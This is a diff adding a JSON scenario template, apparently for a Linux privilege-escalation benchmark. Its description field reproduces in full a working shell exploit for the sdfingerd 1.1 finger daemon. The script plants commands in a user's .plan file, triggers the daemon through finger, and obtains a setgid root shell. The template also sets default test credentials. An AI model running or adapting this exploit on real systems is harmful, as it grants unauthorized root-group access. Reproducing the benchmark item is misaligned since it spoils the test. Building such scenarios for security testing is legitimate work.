@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_22806",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: SDFingerD 1.1 - Failure To Drop Privileges Privilege Escalation\n\nExploit source code (22806.sh):\n```\nsource: https://www.securityfocus.com/bid/7977/info\n\nsdfingerd has been reported prone to a local privilege escalation vulnerability. The issue presents itself because the sdfingerd daemon fails to sufficiently drop group privileges before executing commands that are contained in a users .plan file.\n\n#!/bin/sh\n# sdfingerd[v1.1]: local root(gid=0) exploit.\n# by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\n#\n# sdfingerd URL/reference:\n#  http://www.schmolze.com/projects/sdfingerd/\n#\n# sdfingerd(Simple Dynamic Finger) is a finger\n# daemon with the main focus of allowing users\n# to be able to have dynamic .plan files.  dynamic\n# as in allows users to place commands in their\n# .plan file.  when a third party command is called,\n# the user id privileges get set to that of the user\n# being requested.  but, the group id is left as-is.\n# since, this program is designed/defaulted to run\n# as root via inetd, gid=0(root) is freely available.\n#\n# ----------------- example usage -----------------\n# [v9@localhost v9]$ id\n# uid=1001(v9) gid=1001(v9) groups=1001(v9)\n# [v9@localhost v9]$ sh xsdfingerd.sh\n# * sdfingerd[v1.1]: local root(gid) exploit.\n# * by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\n# * exploit successful.\n# -rwx--s--- 1 v9 root 13960 Jun 18 18:38 /tmp/xsh\n# sh-2.04$ id\n# uid=1001(v9) gid=0(root) groups=1001(v9)\n# -------------------------------------------------\necho \"* sdfingerd[v1.1]: local root(gid=0) exploit.\"\necho \"* by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\"\nrm -rf ~/.plan /tmp/xsh.c /tmp/xsh\ncat <<_EOF_>/tmp/xsh.c\n#include <unistd.h>\n#include <sys/types.h>\n#include <unistd.h>\nint main(){\n setregid(getegid(),getegid());\n execl(\"/bin/sh\",\"sh\",0);\n exit(0);\n}\n_EOF_\ncc /tmp/xsh.c -o /tmp/xsh\ncat <<_EOF_>~/.plan\n\\$!chown \\`id -u\\`.\\`id -g\\` /tmp/xsh!$\n\\$!chmod 2710 /tmp/xsh!$\n_EOF_\nfinger ${USER}@localhost>/dev/null\nrm -rf ~/.plan /tmp/xsh.c\nif test -g \"/tmp/xsh\"\nthen\n echo \"* exploit successful.\"\n ls -l /tmp/xsh\n /tmp/xsh\nelse\n echo \"! exploit failed.\"\n rm -rf /tmp/xsh\nfi\n```",
+  "cve": "",
+  "exploitdb_id": "22806",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_22806",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
